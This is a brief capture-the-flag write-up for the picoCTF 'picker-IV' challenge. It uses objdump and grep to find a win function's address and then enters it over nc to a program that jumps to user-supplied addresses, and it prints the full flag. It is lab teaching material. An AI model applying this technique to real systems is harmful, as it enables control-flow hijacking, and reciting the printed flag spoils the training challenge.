You can use gdb to get address of win or just do objdump
```bash
$ objdump -D picker-IV -M intel | grep "win" 
```
Doing objdump with grep we get the address of win function
Now entering this address on connecting to the server, we get the flag

```bash
$ nc saturn.picoctf.net [REDACTED]
Enter the address in hex to jump to, excluding '0x': 000000000040129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```

**FLAG - `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}`**

